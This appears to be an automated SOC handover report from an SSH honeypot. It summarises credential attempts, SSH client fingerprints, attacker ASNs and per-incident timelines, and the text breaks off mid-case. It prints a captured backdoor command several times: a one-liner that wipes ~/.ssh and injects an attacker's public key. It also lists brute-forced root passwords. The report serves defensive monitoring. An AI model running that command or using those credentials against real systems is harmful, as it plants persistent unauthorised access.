# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-13 |
| **Generated At** | 2026-05-13T23:08:41Z |
| **Shift Time** | 23:08 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **172** |
| Confirmed Threats | **94** |
| False Positives Filtered | **78** (45.4%) |
| Unique Attacker IPs | **33** |
| Countries of Origin | **19** |
| High Severity Cases | **30** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **142** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **55** |
| Unique Credential Pairs | **27** |
| Unique Usernames | **12** |
| Unique Passwords | **27** |
| Successful Auth Pairs | **22** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 30 |
| `345gs5662d34` | 15 |
| `www-data` | 1 |
| `sammy` | 1 |
| `wanghao` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 15 |
| `1Password` | 1 |
| `www-data` | 1 |
| `sammy` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `root` | `3245gs5662d34` | 15 |
| `root` | `1Password` | 1 |
| `www-data` | `www-data` | 1 |
| `sammy` | `sammy` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1Password` | `95.81.113.94` | 2026-05-13T21:27:53 |
| `root` | `3245gs5662d34` | `95.81.113.94` | 2026-05-13T21:27:57 |
| `root` | `qwer1234!` | `95.81.113.94` | 2026-05-13T21:32:37 |
| `root` | `90-=op[]` | `95.81.113.94` | 2026-05-13T21:35:48 |
| `root` | `Qwe2024@` | `144.31.186.200` | 2026-05-13T21:38:25 |
| `root` | `3245gs5662d34` | `144.31.186.200` | 2026-05-13T21:38:28 |
| `root` | `2345` | `95.81.113.94` | 2026-05-13T21:38:53 |
| `root` | `rootrootroot` | `45.158.244.111` | 2026-05-13T21:39:14 |
| `root` | `3245gs5662d34` | `45.158.244.111` | 2026-05-13T21:39:19 |
| `root` | `Hg123456` | `95.81.113.94` | 2026-05-13T21:40:32 |
| `root` | `861027` | `95.81.113.94` | 2026-05-13T21:42:13 |
| `root` | `20232023` | `95.81.113.94` | 2026-05-13T21:43:50 |
| `root` | `qazxsw` | `95.81.113.94` | 2026-05-13T21:45:28 |
| `root` | `Root2025!` | `144.79.187.21` | 2026-05-13T21:47:52 |
| `root` | `3245gs5662d34` | `144.79.187.21` | 2026-05-13T21:47:55 |
| `root` | `qwerty12345678` | `95.81.113.94` | 2026-05-13T21:48:44 |
| `root` | `Haslo3@1` | `156.245.246.50` | 2026-05-13T21:52:51 |
| `root` | `3245gs5662d34` | `156.245.246.50` | 2026-05-13T21:52:54 |
| `root` | `100200` | `155.4.245.222` | 2026-05-13T21:54:20 |
| `root` | `3245gs5662d34` | `155.4.245.222` | 2026-05-13T21:54:28 |
| `root` | `cooldude` | `45.123.217.22` | 2026-05-13T21:58:10 |
| `root` | `3245gs5662d34` | `45.123.217.22` | 2026-05-13T21:58:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **172** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 75 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 47 | 6 |
| `af8223ac9914...` | libssh-based | 21 | 1 |
| `03a80b21afa8...` | Modern SSH client | 6 | 4 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 47 | 6 | Mirai/variant |
| `af8223ac9914...` | libssh | 21 | 1 | libssh-based |
| `03a80b21afa8...` | libssh | 6 | 4 | Modern SSH client |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 15 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `155.4.245.222`, `45.158.244.111`, `156.245.246.50`, `144.79.187.21`, `45.123.217.22`, `95.81.113.94`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **33** |
| Unique ASNs | **27** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS8473` | Bahnhof AB | 1 | HIGH |
| `AS134375` | Fusionnet Web Services Private Limited | 1 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (30)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-027e9b2966e2

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:27 |
| **Last Seen** | 2026-05-13 21:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:27:52` | `cowrie.session.connect` |
| `2026-05-13 21:27:52` | `cowrie.client.version` |
| `2026-05-13 21:27:52` | `cowrie.client.kex` |
| `2026-05-13 21:27:53` | `cowrie.login.success` |
| `2026-05-13 21:27:53` | `cowrie.session.params` |
| `2026-05-13 21:27:53` | `cowrie.command.input` |
| `2026-05-13 21:27:53` | `cowrie.command.failed` |
| `2026-05-13 21:27:53` | `cowrie.log.closed` |
| `2026-05-13 21:27:53` | `cowrie.session.params` |
| `2026-05-13 21:27:53` | `cowrie.command.input` |
| `2026-05-13 21:27:54` | `cowrie.session.file_download` |
| `2026-05-13 21:27:54` | `cowrie.log.closed` |
| `2026-05-13 21:27:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d38baa2731ce

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:27 |
| **Last Seen** | 2026-05-13 21:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:27:56` | `cowrie.session.connect` |
| `2026-05-13 21:27:56` | `cowrie.client.version` |
| `2026-05-13 21:27:56` | `cowrie.client.kex` |
| `2026-05-13 21:27:57` | `cowrie.login.success` |
| `2026-05-13 21:27:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a70af54e687f

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:32 |
| **Last Seen** | 2026-05-13 21:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:32:36` | `cowrie.session.connect` |
| `2026-05-13 21:32:36` | `cowrie.client.version` |
| `2026-05-13 21:32:36` | `cowrie.client.kex` |
| `2026-05-13 21:32:37` | `cowrie.login.success` |
| `2026-05-13 21:32:37` | `cowrie.session.params` |
| `2026-05-13 21:32:37` | `cowrie.command.input` |
| `2026-05-13 21:32:37` | `cowrie.command.failed` |
| `2026-05-13 21:32:37` | `cowrie.log.closed` |
| `2026-05-13 21:32:38` | `cowrie.session.params` |
| `2026-05-13 21:32:38` | `cowrie.command.input` |
| `2026-05-13 21:32:38` | `cowrie.session.file_download` |
| `2026-05-13 21:32:38` | `cowrie.log.closed` |
| `2026-05-13 21:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f2413056c0e

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:32 |
| **Last Seen** | 2026-05-13 21:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:32:40` | `cowrie.session.connect` |
| `2026-05-13 21:32:40` | `cowrie.client.version` |
| `2026-05-13 21:32:40` | `cowrie.client.kex` |
| `2026-05-13 21:32:41` | `cowrie.login.success` |
| `2026-05-13 21:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15f925a3c537

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:35 |
| **Last Seen** | 2026-05-13 21:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:35:47` | `cowrie.session.connect` |
| `2026-05-13 21:35:47` | `cowrie.client.version` |
| `2026-05-13 21:35:47` | `cowrie.client.kex` |
| `2026-05-13 21:35:48` | `cowrie.login.success` |
| `2026-05-13 21:35:48` | `cowrie.session.params` |
| `2026-05-13 21:35:48` | `cowrie.command.input` |
| `2026-05-13 21:35:48` | `cowrie.command.failed` |
| `2026-05-13 21:35:49` | `cowrie.log.closed` |
| `2026-05-13 21:35:49` | `cowrie.session.params` |
| `2026-05-13 21:35:49` | `cowrie.command.input` |
| `2026-05-13 21:35:49` | `cowrie.session.file_download` |
| `2026-05-13 21:35:49` | `cowrie.log.closed` |
| `2026-05-13 21:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56b74ada0e6f

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:35 |
| **Last Seen** | 2026-05-13 21:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:35:51` | `cowrie.session.connect` |
| `2026-05-13 21:35:51` | `cowrie.client.version` |
| `2026-05-13 21:35:51` | `cowrie.client.kex` |
| `2026-05-13 21:35:52` | `cowrie.login.success` |
| `2026-05-13 21:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d313ec86ff

| Field | Detail |
|---|---|
| **Source IP** | `144.31.186[.]200` |
| **First Seen** | 2026-05-13 21:38 |
| **Last Seen** | 2026-05-13 21:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:38:24` | `cowrie.session.connect` |
| `2026-05-13 21:38:24` | `cowrie.client.version` |
| `2026-05-13 21:38:24` | `cowrie.client.kex` |
| `2026-05-13 21:38:25` | `cowrie.login.success` |
| `2026-05-13 21:38:25` | `cowrie.session.params` |
| `2026-05-13 21:38:25` | `cowrie.command.input` |
| `2026-05-13 21:38:25` | `cowrie.command.failed` |
| `2026-05-13 21:38:25` | `cowrie.log.closed` |
| `2026-05-13 21:38:25` | `cowrie.session.params` |
| `2026-05-13 21:38:25` | `cowrie.command.input` |
| `2026-05-13 21:38:25` | `cowrie.session.file_download` |
| `2026-05-13 21:38:25` | `cowrie.log.closed` |
| `2026-05-13 21:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.31.186[.]200` to AbuseIPDB if not already reported
- [ ] Block `144.31.186[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33789b9ef284

| Field | Detail |
|---|---|
| **Source IP** | `144.31.186[.]200` |
| **First Seen** | 2026-05-13 21:38 |
| **Last Seen** | 2026-05-13 21:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:38:27` | `cowrie.session.connect` |
| `2026-05-13 21:38:27` | `cowrie.client.version` |
| `2026-05-13 21:38:28` | `cowrie.client.kex` |
| `2026-05-13 21:38:28` | `cowrie.login.success` |
| `2026-05-13 21:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.31.186[.]200` to AbuseIPDB if not already reported
- [ ] Block `144.31.186[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b4911ab688f

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:38 |
| **Last Seen** | 2026-05-13 21:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:38:52` | `cowrie.session.connect` |
| `2026-05-13 21:38:52` | `cowrie.client.version` |
| `2026-05-13 21:38:52` | `cowrie.client.kex` |
| `2026-05-13 21:38:53` | `cowrie.login.success` |
| `2026-05-13 21:38:53` | `cowrie.session.params` |
| `2026-05-13 21:38:53` | `cowrie.command.input` |
| `2026-05-13 21:38:53` | `cowrie.command.failed` |
| `2026-05-13 21:38:53` | `cowrie.log.closed` |
| `2026-05-13 21:38:53` | `cowrie.session.params` |
| `2026-05-13 21:38:53` | `cowrie.command.input` |
| `2026-05-13 21:38:54` | `cowrie.session.file_download` |
| `2026-05-13 21:38:54` | `cowrie.log.closed` |
| `2026-05-13 21:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e4e983c2734

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:38 |
| **Last Seen** | 2026-05-13 21:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:38:56` | `cowrie.session.connect` |
| `2026-05-13 21:38:56` | `cowrie.client.version` |
| `2026-05-13 21:38:56` | `cowrie.client.kex` |
| `2026-05-13 21:38:57` | `cowrie.login.success` |
| `2026-05-13 21:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.81.113[.]94` to AbuseIPDB if not already reported
- [ ] Block `95.81.113[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea4a4ae36591

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-05-13 21:39 |
| **Last Seen** | 2026-05-13 21:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:39:13` | `cowrie.session.connect` |
| `2026-05-13 21:39:13` | `cowrie.client.version` |
| `2026-05-13 21:39:13` | `cowrie.client.kex` |
| `2026-05-13 21:39:14` | `cowrie.login.success` |
| `2026-05-13 21:39:14` | `cowrie.session.params` |
| `2026-05-13 21:39:14` | `cowrie.command.input` |
| `2026-05-13 21:39:14` | `cowrie.command.failed` |
| `2026-05-13 21:39:15` | `cowrie.log.closed` |
| `2026-05-13 21:39:15` | `cowrie.session.params` |
| `2026-05-13 21:39:15` | `cowrie.command.input` |
| `2026-05-13 21:39:15` | `cowrie.session.file_download` |
| `2026-05-13 21:39:15` | `cowrie.log.closed` |
| `2026-05-13 21:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c80e90d7b5bc

| Field | Detail |
|---|---|
| **Source IP** | `45.158.244[.]111` |
| **First Seen** | 2026-05-13 21:39 |
| **Last Seen** | 2026-05-13 21:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 21:39:18` | `cowrie.session.connect` |
| `2026-05-13 21:39:18` | `cowrie.client.version` |
| `2026-05-13 21:39:18` | `cowrie.client.kex` |
| `2026-05-13 21:39:19` | `cowrie.login.success` |
| `2026-05-13 21:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.244[.]111` to AbuseIPDB if not already reported
- [ ] Block `45.158.244[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-500238648b0f

| Field | Detail |
|---|---|
| **Source IP** | `95.81.113[.]94` |
| **First Seen** | 2026-05-13 21:40 |
| **Last Seen** | 2026-05-13 21:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

